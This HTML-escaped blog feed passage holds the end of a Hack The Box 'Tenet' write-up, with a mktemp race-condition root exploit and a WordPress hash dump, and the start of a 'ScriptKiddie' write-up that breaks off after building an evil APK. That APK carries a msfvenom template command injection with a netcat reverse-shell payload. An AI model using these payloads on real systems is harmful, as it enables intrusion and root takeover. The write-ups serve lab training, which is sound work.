&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As credential reuse is common, running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su neil&lt;/code&gt; and providing the recently found password, we have succeeded in accessing the machine as this user and getting the user flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neil@tenet:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
neil@tenet:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/user.txt
&amp;lt;redacted&amp;gt;
neil@tenet:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;p&gt;In the path for root flag, decided to dump the database credentials in this machine, returning the following hashes.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before trying to crack those hashes, being &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;protagonist&lt;/code&gt; password reused from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, decided to check which permissions did &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neil&lt;/code&gt; had by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, which resulted in the output below.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
    
User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inspecting the content of this file, we can see that it can be used to activate SSH login for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; enforcing an existing SSH public key.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

checkAdded&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;sshName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/bin/echo &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; | /usr/bin/cut &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 3&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/bin/grep &lt;span class=&quot;nv&quot;&gt;$sshName&lt;/span&gt; /root/.ssh/authorized_keys&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        /bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Successfully added &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sshName&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; to authorized_keys file!&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        /bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Error in adding &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sshName&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; to authorized_keys file!&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

checkFile&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        /bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Error in creating key file!&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt; /bin/rm &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

addKey&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;tmpName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; /tmp/ssh-XXXXXXXX&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;110&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    /bin/echo &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;
    checkFile &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;
    /bin/cat &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;/root/.ssh/authorized_keys
    /bin/rm &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;&lt;/span&gt;
addKey
checkAdded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we don’t have the private key, we could possibly hijack it’s execution because the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addKey&lt;/code&gt; creates a temporary file containing the public key to be added to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;’s authorized keys, having a race condition. If we could manage to overwrite this file during the script execution, we could inject our public key instead of the one present in the script.&lt;/p&gt;

&lt;p&gt;The challenge here is to predict the name of the file created, once it uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mktemp&lt;/code&gt; command, but as we have an idea of its format (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/ssh-XXXXX&lt;/code&gt;) we could find a way to paste the contents from our public key to all files matching the same pattern. After some tests and research, the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tee&lt;/code&gt; was the solution, allowing us to output a content to multiple files at the same time. The simple script below was created to do this task.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAA..............BBBB= root@ubuntu&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; /tmp/ssh-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt; /dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the above script in execution, simply executed the bash script with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; and then connected to the box with the previously created ssh private key, granting me root access and allowing to get the root flag :smiley:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neil@tenet:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;  /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tenet root@tenet.htb
Welcome to Ubuntu 18.04.5 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.15.0-129-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
root@tenet:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@tenet:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
b05e57e997cda49b47757cd3f0f9ac43
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I hope you guys have enjoyed this box resolution!&lt;/p&gt;

&lt;p&gt;See you in the next post! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Hello guys! This week’s machine will be Tenet, another medium-rated Linux box from Hack The Box, created by egotisticalSW.</summary></entry><entry><title type="html">Hackthebox write-up: ScriptKiddie</title><link href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/" rel="alternate" type="text/html" title="Hackthebox write-up: ScriptKiddie" /><published>2021-06-05T13:00:00-03:00</published><updated>2021-06-05T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/06/htb-scriptkiddie</id><content type="html" xml:base="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/">&lt;p&gt;Hello guys!&lt;/p&gt;

&lt;p&gt;This week’s machine will be &lt;strong&gt;ScriptKiddie&lt;/strong&gt;, another easy-rated Linux box from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/4935&quot;&gt;0xdf&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;:  Write-ups for Hack The Box machines are posted as soon as they’re retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/W5wv9JE.png&quot; alt=&quot;HTB ScriptKiddie&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, started running a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; quick scan, to see which services were published in this machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.226                                                                   

Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-24 14:05 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.226
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
5000/tcp open  http    Werkzeug httpd 0.16.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python 3.8.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d&lt;span class=&quot;s1&quot;&gt;'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;5000tcp---http-service&quot;&gt;5000/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;Once accessed the published page, noticed some hacking tools published making easier to a script kiddie to play with hacking, allowing you to scan an IP using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; payload or search for exploits using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I’ve tried several ways to inject command in these forms, but none of the attempts succeeded. I have even found an interesting tool called &lt;a href=&quot;https://github.com/commixproject/commix&quot;&gt;commixproject/commix&lt;/a&gt; in GitHub that automates this process, but had no luck this time.&lt;/p&gt;

&lt;p&gt;Looking for vulnerabilities in the tools used by the app (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;), I have found one related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;, as below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit msfvenom
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                        |  Path
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Metasploit Framework 6.0.11 - msfvenom APK template &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;injection | multiple/local/49491.py
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;initial-access-and-user-flag&quot;&gt;Initial access and User flag&lt;/h2&gt;

&lt;p&gt;After changing the python script available in searchsploit, using the desired payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f&lt;/code&gt;, I have found some errors during the execution of the binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keytool&lt;/code&gt;, once it tries to sign an APK file with the payload in the Common Name but, as there was a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; in the base64 encoded content, made a quick change to encode it twice, allowing me to create an evil APK to be uploaded to the tool and exploit the vulnerability&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# b64encode to avoid badchars (keytool is picky)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'| base64 -d | base64 -d'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'| base64 -d'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;dname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CN='|echo -n &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; | sh #&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Below we can see the output of the execution which generates the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.apk&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49491.py                                                                                                               
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Manufacturing evil apkfile
Payload: &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
&lt;span class=&quot;nt&quot;&gt;-dname&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning:
The signer'&lt;/span&gt;s certificate is self-signed.
The SHA1 algorithm specified &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the &lt;span class=&quot;nt&quot;&gt;-digestalg&lt;/span&gt; option is considered a security risk. This algorithm will be disabled &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a future update.
The SHA1withRSA algorithm specified &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the &lt;span class=&quot;nt&quot;&gt;-sigalg&lt;/span&gt; option is considered a security risk. This algorithm will be disabled &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk
